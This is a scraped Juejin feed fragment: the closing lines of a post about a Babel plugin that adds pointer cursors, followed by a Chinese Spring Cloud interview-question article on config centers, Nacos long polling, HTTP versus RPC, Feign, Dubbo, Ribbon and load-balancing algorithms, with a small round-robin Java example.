<p>在开发中，我经常因为忘记加 <code>cursor: pointer</code> 而被 UI 评审打回。后来我意识到：<strong>为什么不能让机器自动处理这些小事？</strong></p>
<p><code>babel-plugin-pointer</code> 就是这种思路的实践——​<strong>让机器做机器的事，开发者只该关注创造​</strong>​。</p>
<h2 data-id="heading-11">❤️ 你的支持就是我的动力</h2>
<ul>
<li>✨ ​<strong>Star</strong>​：在 GitHub 上给这个项目点个 Star</li>
<li>🐛 ​<strong>Issue</strong>​：发现 bug 或有建议？欢迎提交 Issue</li>
<li>💬 ​<strong>分享</strong>​：把这篇文章分享给你的同事，一起告别“手型光标”烦恼</li>
<li>⚡ ​<strong>持续优化</strong>​：后续将支持自定义光标值、元素过滤等</li>
</ul>
<blockquote>
<p><strong>让机器做机器的事，开发者只该关注创造。</strong></p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[SpringCloud 常见面试题（二）]]></title>    <link>https://juejin.cn/post/7574718964045299762</link>    <guid>https://juejin.cn/post/7574718964045299762</guid>    <pubDate>2025-11-21T06:01:46.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7574718964045299762" data-draft-id="7572502156487098394" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content=" SpringCloud 常见面试题（二）"/> <meta itemprop="keywords" content="Java"/> <meta itemprop="datePublished" content="2025-11-21T06:01:46.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="SevenCoding"/> <meta itemprop="url" content="https://juejin.cn/user/3261615728242467"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
             SpringCloud 常见面试题（二）
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3261615728242467/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    SevenCoding
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-21T06:01:46.000Z" title="Fri Nov 21 2025 06:01:46 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读33分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">配置中心</h2>
<h3 data-id="heading-1">什么是配置中心?有哪些常见的配置中心?</h3>
<p>配置中心是一个用于配置集中化管理目支持动态更新、分发配置文件的工具(服务)。</p>
<p>它实现了配置的统一管理和动态同新，当配置信息发生变化时，配置中心可以自动通知服务实例进行配置更新，这样就可以实例无需重启即可应用最新的配置，从一定程度上减少了系统访问的空窗期，非常灵活方便</p>
<p>常见的配置中心：</p>
<ul>
<li>Spring Cloud Config：Spring 提供的分布式配置管理工具，支持从 Git、SVN 等版本控制系统加载配置</li>
<li>Apollo：由携程开源的配置管理中心，支持配置的实时推送和权限管理。</li>
<li>Nacos：阿里巴巴的配置管理和服务发现工具，既支持配置中心功能，又能作为注册中心使用。</li>
<li>Consul：HashiCorp 提供的分布式系统管理工具，既可以用作服务发现，也可以用于存储和分发配置</li>
<li>Etcd：分布式键值存储工具，常用于 Kubernetes 集群中的配置管理。</li>
<li>Zookeeper：Zookeeper 是一个开源的分布式协调服务，和 Nacos 一样，其既可以作为注册中心，又可以作为配置中心。</li>
</ul>
<h3 data-id="heading-2">为什么微服务需要配置中心？</h3>
<p>微服务架构中的每个服务通常都需要一些配置信息，例如数据库连接地址、服务端口、日志级别等。这些配置可能因为不同环境、不同部署实例或者动态运行时需要进行调整和管理。</p>
<p>微服务的实例一般非常多，如果每个实例都需要一个个地去做这些配置，那么运维成本将会非常大，这时候就需要一个集中化的配置中心，去管理这些配置。</p>
<h3 data-id="heading-3">SpringCloud可以选择哪些配置中心？</h3>
<p>和注册中心一样，SpringCloud也支持对多种配置中心的集成。常见的配置中心选型包括：</p>
<ul>
<li>Spring Cloud Config：官方推荐的配置中心，支持将配置文件存储在Git、SVN等版本控制系统中，并提供RESTful API进行访问和管理。</li>
<li>ZooKeeper：一个开源的分布式协调服务，可以用作配置中心。它具有高可用性、一致性和通知机制等特性。</li>
<li>Consul：另一个开源的分布式服务发现和配置管理工具，也可用作配置中心。支持多种配置文件格式，提供健康检查、故障转移和动态变更等功能。</li>
<li>Etcd：一个分布式键值存储系统，可用作配置中心。它使用基于<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.seven97.top%2Fmicroservices%2Fprotocol%2Fraft-detail.html" target="_blank" title="https://www.seven97.top/microservices/protocol/raft-detail.html" ref="nofollow noopener noreferrer">Raft算法</a>的一致性机制，提供分布式数据一致性保证。</li>
<li>Apollo：携程开源的配置中心，支持多种语言和框架。提供细粒度的配置权限管理、配置变更通知和灰度发布等高级特性，还有可视化的配置管理界面。</li>
<li>Nacos：阿里巴巴开源的服务发现、配置管理和服务管理平台，也可以作为配置中心使用。支持服务注册与发现、动态配置管理、服务健康监测和动态DNS服务等功能。</li>
</ul>
<h3 data-id="heading-4">Nacos配置中心的原理了解吗？</h3>
<p>配置中心，说白了就是一句话：配置信息的CRUD。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ed749984d2a14c9797dab18076aa692f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU2V2ZW5Db2Rpbmc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764309706&amp;x-signature=jSsdhBOJ6VYLy8F%2BS4hyAEN6JxU%3D" alt="" loading="lazy"/></p>
<p>具体的实现大概可以分成这么几个部分：</p>
<ol>
<li>配置信息存储：Nacos默认使用内嵌数据库Derby来存储配置信息，还可以采用MySQL等关系型数据库。</li>
<li>注册配置信息：服务启动时，Nacos Client会向Nacos Server注册自己的配置信息，这个注册过程就是把配置信息写入存储，并生成版本号。</li>
<li>获取配置信息：服务运行期间，Nacos Client通过API从Nacos Server获取配置信息。Server根据键查找对应的配置信息，并返回给Client。</li>
<li>监听配置变化：Nacos Client可以通过注册监听器的方式，实现对配置信息的监听。当配置信息发生变化时，Nacos Server会通知已注册的监听器，并触发相应的回调方法。</li>
</ol>
<h3 data-id="heading-5">Nacos配置中心长轮询机制？</h3>
<p>一般来说客户端和服务端的交互分为两种：推（Push）和拉（Pull），Nacos在<strong>Pull的基础上，采用了长轮询来进行配置的动态刷新</strong>。  详情可以看这篇文章<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.seven97.top%2Fmicroservices%2Fservice-registration-and-discovery%2Fnacos-interactionmodel.html" target="_blank" title="https://www.seven97.top/microservices/service-registration-and-discovery/nacos-interactionmodel.html" ref="nofollow noopener noreferrer">Nacos交互模型</a></p>
<p>在长轮询模式下，客户端定时向服务端发起请求，检查配置信息是否发生变更。如果没有变更，服务端会"hold"住这个请求，即暂时不返回结果，直到配置发生变化或达到一定的超时时间。</p>
<p>具体的实现过程如下：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c56b011c8bed4759940e5e0f5335f306~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU2V2ZW5Db2Rpbmc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764309706&amp;x-signature=4KJ1dWLLXY6ylAXcFpmlWTxTG5E%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fd84464065e74967b3baf9b078296d85~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU2V2ZW5Db2Rpbmc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764309706&amp;x-signature=RwAQgklEC9C2yYZ7%2FIGFXOBQ6hk%3D" alt="" loading="lazy"/></p>
<p>如果客户端发起 Pull 请求，服务端收到请求之后，先检查配置是否发生了变更：</p>
<ul>
<li>变更：返回变更配置；</li>
<li>无变更：设置一个定时任务，延期 29.5s 执行，把当前的客户端长轮询连接加入 allSubs 队列；</li>
</ul>
<p>在这 29.5s 内的配置变化：</p>
<ul>
<li>配置无变化：等待 29.5s 后触发自动检查机制，返回配置；</li>
<li>配置变化：在 29.5s 内任意一个时刻配置变化，会触发一个事件机制，监听到该事件的任务会遍历 allSubs 队列，找到发生变更的配置项对应的 ClientLongPolling 任务，将变更的数据通过该任务中的连接进行返回。相当于完成了一次 PUSH 操作；</li>
</ul>
<p>长轮询机制结合了 Pull 机制和 Push 机制的优点； 通过长轮询的方式，Nacos客户端能够实时感知配置的变化，并及时获取最新的配置信息。同时，这种方式也降低了服务端的压力，避免了大量的长连接占用内存资源。</p>
<h3 data-id="heading-6">Nacos的服务注册表结构是怎样的？</h3>
<p>Nacos采用了数据的分级存储模型，最外层是Namespace，用来隔离环境。然后是Group，用来对服务分组。接下来就是服务（Service）了，一个服务包含多个实例，但是可能处于不同机房，因此Service下有多个集群（Cluster），Cluster下是不同的实例（Instance）。</p>
<p>对应到Java代码中，Nacos采用了一个多层的Map来表示。结构为<code>Map&lt;String, Map&lt;String, Service&gt;&gt;</code>，其中最外层Map的key就是namespaceId，值是一个Map。内层Map的key是group拼接serviceName，值是Service对象。Service对象内部又是一个Map，key是集群名称，值是Cluster对象。而Cluster对象内部维护了Instance的集合。</p>
<h3 data-id="heading-7">Nacos中的Namespace是什么？如何使用它来组织和管理微服务</h3>
<p>Nacos中的Namespace是用于隔离不同环境或应用之间的配置和服务信息的概念。通过使用Namespace，可以将不同的环境（例如开发、测试和生产）或不同的应用程序（例如Web应用和移动应用）的配置和服务信息分离开来，以避免冲突和错误。</p>
<p>在Nacos中，每个Namespace都有自己独立的配置和服务注册表。这意味着，如果有多个应用程序需要使用Nacos，可以将它们分别放置在不同的Namespace中。每个Namespace都有自己的命名空间ID，用于标识该Namespace。要使用Namespace，在Nacos客户端初始化时，需要指定要使用的Namespace ID。</p>
<p>通过使用Namespace，可以对不同Namespace下的服务进行分组和管理，例如可以使用Nacos提供的Group功能对同一Namespace下的服务进行分组，方便管理和查找。同时，使用Namespace还可以对不同环境下的配置进行隔离，避免不同环境之间的配置冲突。</p>
<h3 data-id="heading-8">SpringCloud Config 是什么?</h3>
<p>SpringCloud Config 为分布式系统外部化配置提供了服务端以及客户端的支持，简单来说就是一个配置中心，其主要包括以下两个部分的内容：Config Sever和 Config Cient 。</p>
<ul>
<li>ConfigServer是一个可横向扩展，并且集中式配置的服务器，主要用于集中管理服务各种环境下的配置，然后默认使用 Git进行存储配置的内容，因此可以很方便地实现配置的版本控制</li>
<li>Config Client 是 Config Server 的客户端，主要用于操作存储在 Config Server 中的配置信息。</li>
</ul>
<h2 data-id="heading-9">远程调用</h2>
<h3 data-id="heading-10">说说微服务之间是如何独立通讯的？</h3>
<p><strong>远程过程调用（Remote Procedure Invocation）</strong></p>
<p>也就是我们常说的服务的注册与发现，直接通过远程过程调用来访问别的service。</p>
<p><strong>优点</strong>：简单，常见,因为没有中间件代理，系统更简单</p>
<p><strong>缺点</strong>：只支持请求/响应的模式，不支持别的，比如通知、请求/异步响应、发布/订阅、发布/异步响应，降低了可用性，因为客户端和服务端在请求过程中必须都是可用的。</p>
<p><strong>消息</strong></p>
<p>使用异步消息来做服务间通信。服务间通过消息管道来交换消息，从而通信。</p>
<p><strong>优点</strong>：把客户端和服务端解耦，更松耦合，提高可用性，因为消息中间件缓存了消息，直到消费者可以消费，    支持很多通信机制比如通知、请求/异步响应、发布/订阅、发布/异步响应。</p>
<p><strong>缺点</strong>：消息中间件有额外的复杂。</p>
<h3 data-id="heading-11">说说 RPC 的实现原理</h3>
<p>首先需要有处理网络连接通讯的模块，负责连接建立、管理和消息的传输。其次需要有编 解码的模块，因为网络通讯都是传输的字节码，需要将我们使用的对象序列化和反序列化。剩下的就是客户端和服务器端的部分，服务器端暴露要开放的服务接口，客户调用服 务接口的一个代理实现，这个代理实现负责收集数据、编码并传输给服务器然后等待结果返回。</p>
<h3 data-id="heading-12">能说下HTTP和RPC的区别吗？</h3>
<p>严格来讲，HTTP和RPC不是一个层面的东西：</p>
<ul>
<li>HTTP（Hypertext Transfer Protocol）是一种应用层协议，主要强调的是网络通信；</li>
<li>RPC（Remote Procedure Call，远程过程调用）是一种用于分布式系统之间通信的协议，强调的是服务之间的远程调用。</li>
</ul>
<p>一些RPC框架比如gRPC，底层传输协议其实也是用的HTTP2，包括Dubbo3，也兼容了gRPC，使用了HTTP2作为传输层的一层协议。</p>
<p>如果硬要说区别的话，如下：</p>













































<table><thead><tr><th/><th>HTTP</th><th>RPC</th></tr></thead><tbody><tr><td>定义</td><td>HTTP（超文本传输协议）是一种用于传输超文本的协议。</td><td>RPC（远程过程调用）是一种用于实现分布式系统中不同节点之间通信的协议。</td></tr><tr><td>通信方式</td><td>基于请求-响应模型，客户端发送请求，服务器返回响应。</td><td>基于方法调用模型，客户端调用远程方法并等待结果。</td></tr><tr><td>传输协议</td><td>基于TCP协议，可使用其他传输层协议如TLS/SSL进行安全加密。</td><td>可以使用多种传输协议，如TCP、UDP等。</td></tr><tr><td>数据格式</td><td>基于文本，常用的数据格式有JSON、XML等。</td><td>可以使用各种数据格式，如二进制、JSON、Protocol Buffers等。</td></tr><tr><td>接口定义</td><td>使用RESTful风格的接口进行定义，常用的方法有GET、POST、PUT、DELETE等。</td><td>使用IDL（接口定义语言）进行接口定义，如Protocol Buffers、Thrift等。</td></tr><tr><td>跨语言性</td><td>支持跨语言通信，可以使用HTTP作为通信协议实现不同语言之间的通信。</td><td>支持跨语言通信，可以使用IDL生成不同语言的客户端和服务端代码。</td></tr><tr><td>灵活性</td><td>更加灵活，适用于不同类型的应用场景，如Web开发、API调用等。</td><td>更加高效，适用于需要高性能和低延迟的分布式系统。</td></tr></tbody></table>
<p>在微服务体系里，基于HTTP风格的远程调用通常使用框架如Feign来实现，基于RPC的远程调用通常使用框架如Dubbo来实现。</p>
<h3 data-id="heading-13">那Feign和Dubbo的区别呢？</h3>
<p>这两个才是适合拿来比较的东西：</p>













































<table><thead><tr><th/><th>Feign</th><th>Dubbo</th></tr></thead><tbody><tr><td>定义</td><td>Feign是一个声明式的Web服务客户端，用于简化HTTP API的调用。</td><td>Dubbo是一个分布式服务框架，用于构建面向服务的微服务架构。</td></tr><tr><td>通信方式</td><td>基于HTTP协议，使用RESTful风格的接口进行定义和调用。</td><td>基于RPC协议，支持多种序列化协议如gRPC、Hessian等。</td></tr><tr><td>服务发现</td><td>通常结合服务注册中心（如Eureka、Consul）进行服务发现和负载均衡。</td><td>通过ZooKeeper、Nacos等进行服务注册和发现，并提供负载均衡功能。</td></tr><tr><td>服务治理</td><td>不直接提供服务治理功能，需要结合其他组件或框架进行服务治理。</td><td>提供服务注册与发现、负载均衡、容错机制、服务降级等服务治理功能。</td></tr><tr><td>跨语言性</td><td>支持跨语言通信，可以使用HTTP作为通信协议实现不同语言之间的通信。</td><td>支持跨语言通信，通过Dubbo的IDL生成不同语言的客户端和服务端代码。</td></tr><tr><td>生态系统</td><td>集成了Spring Cloud生态系统，与Spring Boot无缝集成。</td><td>拥有完整的生态系统，包括注册中心、配置中心、监控中心等组件。</td></tr><tr><td>适用场景</td><td>适用于构建RESTful风格的微服务架构，特别适合基于HTTP的微服务调用。</td><td>适用于构建面向服务的微服务架构，提供更全面的服务治理和容错机制。</td></tr></tbody></table>
<p>需要注意的是，Feign和Dubbo并不是互斥的关系。实际上，Dubbo可以使用HTTP协议作为通信方式，而Feign也可以集成RPC协议进行远程调用。选择使用哪种远程调用方式取决于具体的业务需求和技术栈的选择。</p>
<h3 data-id="heading-14">负载均衡的意义什么？</h3>
<p>在计算中，负载均衡可以改善跨计算机，计算机集群，网络链接，中央处理单元或磁盘驱动器等多种计算资源的工作负载分布。</p>
<p>负载均衡旨在优化资源使用，最大化吞吐量，最小化响应时间并避免任何单一资源 的过载。使用多个组件进行负载均衡可而不是单个组件可能会通过冗余来提高可靠性和可用性。负载均衡可通常涉及专用软件或硬件，例如多层交换机或域名系统服务器进程。</p>
<h3 data-id="heading-15">集中式与进程内负载均衡的区别</h3>
<p>目前业界主流的负载均衡方案可分成两类：</p>
<ol>
<li>集中式负载均衡, 即在 consumer 和 provider 之间使用独立的负载均衡设施(可以是硬件，如F5, 也可以是软件，如 Nginx), 由该设施负责把 访问请求 通过某种策略转发至 provider；</li>
<li>进程内负载均衡，将负载均衡逻辑集成到 consumer，consumer 从服务注册中心获知有哪些地址可用，然后自己再从这些地址中选择出一个合适的 provider。Ribbon 就属于后者，它只是一个类库，集成于 consumer 进程，consumer 通过它来获取到 provider 的地址。</li>
</ol>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0bc435e309b24a53861b83f8980d27ab~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU2V2ZW5Db2Rpbmc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764309706&amp;x-signature=bPGVlmcz1g5pMjWdFBxgTfLbAH4%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-16">说说有哪些负载均衡算法？</h3>
<p>常见的负载均衡算法包含以下几种：</p>





































<table><thead><tr><th><strong>内置负载均衡规则类</strong></th><th><strong>规则描述</strong></th></tr></thead><tbody><tr><td>RoundRobinRule</td><td>简单轮询服务列表来选择服务器。它是Ribbon默认的负载均衡规则。</td></tr><tr><td>AvailabilityFilteringRule</td><td>对以下两种服务器进行忽略：   <br/>（1）在默认情况下，这台服务器如果3次连接失败，这台服务器就会被设置为“短路”状态。短路状态将持续30秒，如果再次连接失败，短路的持续时间就会几何级地增加。  <br/>（2）并发数过高的服务器。如果一个服务器的并发连接数过高，配置了AvailabilityFilteringRule规则的客户端也会将其忽略。并发连接数的上限，可以由客户端的<code>&lt;clientName&gt;.&lt;clientConfigNameSpace&gt;.ActiveConnectionsLimit</code>属性进行配置。</td></tr><tr><td>WeightedResponseTimeRule</td><td>为每一个服务器赋予一个权重值。服务器响应时间越长，这个服务器的权重就越小。这个规则会随机选择服务器，这个权重值会影响服务器的选择。</td></tr><tr><td><strong>ZoneAvoidanceRule</strong></td><td>以区域可用的服务器为基础进行服务器的选择。使用Zone对服务器进行分类，这个Zone可以理解为一个机房、一个机架等。而后再对Zone内的多个服务做轮询。</td></tr><tr><td>BestAvailableRule</td><td>忽略那些短路的服务器，并选择并发数较低的服务器。</td></tr><tr><td>RandomRule</td><td>随机选择一个可用的服务器。</td></tr><tr><td>RetryRule</td><td>重试机制的选择逻辑</td></tr></tbody></table>
<ul>
<li>轮询算法（Round Robin）：轮询算法是最简单的负载均衡算法之一。它按照顺序将请求依次分配给每个后端服务器，循环往复。当请求到达时，负载均衡器按照事先定义的顺序选择下一个服务器。轮询算法适用于后端服务器具有相同的处理能力和性能的场景。</li>
<li>加权轮询算法（Weighted Round Robin）：加权轮询算法在轮询算法的基础上增加了权重的概念。每个后端服务器都被赋予一个权重值，权重值越高，被选中的概率就越大。这样可以根据服务器的处理能力和性能调整请求的分配比例，使得性能较高的服务器能够处理更多的请求。</li>
<li>随机算法（Random）：随机算法将请求随机分配给后端服务器。每个后端服务器有相等的被选中概率，没有考虑服务器的实际负载情况。这种算法简单快速，适用于后端服务器性能相近且无需考虑请求处理能力的场景。</li>
<li>加权随机算法（Weighted Random）：加权随机算法在随机算法的基础上引入了权重的概念。每个后端服务器被赋予一个权重值，权重值越高，被选中的概率就越大。这样可以根据服务器的处理能力和性能调整请求的分配比例。</li>
<li>最少连接算法（Least Connection）：最少连接算法会根据后端服务器当前的连接数来决定请求的分配。负载均衡器会选择当前连接数最少的服务器进行请求分配，以保证后端服务器的负载均衡。这种算法适用于后端服务器的处理能力不同或者请求的处理时间不同的场景。</li>
<li>哈希算法（Hash）：哈希算法会根据请求的某个特定属性（如客户端IP地址、请求URL等）计算哈希值，然后根据哈希值选择相应的后端服务器。</li>
</ul>
<p>常见的负载均衡器，比如Ribbion、Gateway等等，基本都支持这些负载均衡算法。</p>
<h3 data-id="heading-17">可以用几行代码实现一个负载均衡器吗?</h3>
<blockquote>
<p>不要题目吓到，这类题目不会让你实现一个完整的可以运行的系统，仅用几行代码突出其核心思想即可</p>
</blockquote>
<p>可以，例如可以用常见的轮询(Round Robin)的方式来分发请求。核心就是维护一个服务器列表和当前下标，每次请求返回一个不同的服务器</p>
<pre><code class="hljs language-java" lang="java">List&lt;String&gt; servers = List.of(<span class="hljs-string">"A"</span>, <span class="hljs-string">"B"</span>, <span class="hljs-string">"C"</span>);
<span class="hljs-type">AtomicInteger</span> <span class="hljs-variable">index</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicInteger</span>(<span class="hljs-number">0</span>);

<span class="hljs-keyword">public</span> String <span class="hljs-title function_">getServer</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">return</span> servers.get(index.getAndIncrement() % servers.size());
}
</code></pre>
<p>Atomiclnteger 用来保证在多线程环境下也能安全地自增，不会出现重复或跳号的情况。</p>
<p>轮询的优点是实现简单、平均分配，缺点是不考虑服务器实际负载，所有机器一视同仁。</p>
<h3 data-id="heading-18">什么是Ribbon？</h3>
<p>ribbon是一个负载均衡客户端，可以很好地控制htt和tcp的一些行为。<code>feign默认集成了ribbon</code>。</p>
<h3 data-id="heading-19">什么是 Feign?它的优点是什么？</h3>
<p>Feign 是一个声明式的Web服务客户端。</p>
<p>所谓的声明式就是指不需要编写复杂的关于 Http 请求的东西。只需要声明一个一个接口，然后在这个接口上添加一些注解，这些注解包括了请求的方法(如GET和POST)、请求的URL等信息</p>
<p>Feign 在运行时通过注解和接口上定义的内容来动态构造和发送 Http 请求。所以使用 Feign，开发者只需要定义服务接口并通过注解指明服务名和参数等信息，Feign 就能自动完成 Http  请求的构建、发送和结果处理</p>
<p>Feign 也是 Spring Cloud Netflix 组件之一，结合Spring Cloud 的服务注册和发现、负载均衡等功能，能够让服务间的调用变得更加方便</p>
<p>Feign 的主要特点有:</p>
<ul>
<li>声明式的服务客户端，通过 Java 接口和注解构建服务客户端，简化了 Http 调用的使用过程，无需手动构建 HTTP 请求</li>
<li>很好地融入了 SpringCloud 生态，可以使用 SpringCloud负载均衡、服务熔断等能力</li>
</ul>
<p>使用方式</p>
<ul>
<li>添加pom依赖。</li>
<li>启动类添加<code>@EnableFeignClients</code></li>
<li>定义一个接口<code>@FeignClient(name=“xxx”)</code>指定调用哪个服务</li>
</ul>
<h3 data-id="heading-20">Ribbon和Feign的区别？</h3>
<ol>
<li><strong>启动类注解不同</strong>，Ribbon是@RibbonClient feign的是@EnableFeignClients；</li>
<li><strong>服务指定的位置不同</strong>，Ribbon是在@RibbonClient注解上声明，Feign则是在定义抽象方法的接口中使用@FeignClient声明；</li>
<li><strong>调用方式不同</strong>，Ribbon需要自己构建http请求，模拟http请求。</li>
</ol>
<p>Ribbon是一个客户端负载均衡器，作用在于多个微服务实例间分发请求，提升可用性和性能。它可与各种HTTP客户端如RestTemplate配合使用来发送HTTP请求并进行负载均衡。</p>
<p>Feign则是一个声明式的HTTP客户端，通过编写接口来定义对远程微服务的需求。Feign使用注解和模板方法简化了远程调用的编写，使得调用远程服务的代码更加清晰和简洁。它更注重简洁的声明式编程模型，你只需编写接口并使用注解描述HTTP请求，Feign会在运行时生成实现类来执行实际的HTTP请求。</p>
<p>Ribbon更注重负载均衡，需要配合其他库如RestTemplate来发送http请求，而Feign则采用声明式编程模型，只需编写接口和注解即可。此外，Ribbon提供了自定义负载均衡策略的能力，而Feign通常与Ribbon一起使用以实现负载均衡。</p>
<h3 data-id="heading-21">为什么Feign第一次调用耗时很长？</h3>
<p>主要原因是由于Ribbon的懒加载机制，当第一次调用发生时，Feign会触发Ribbon的加载过程，包括从服务注册中心获取服务列表、建立连接池等操作，这个加载过程会增加首次调用的耗时。</p>
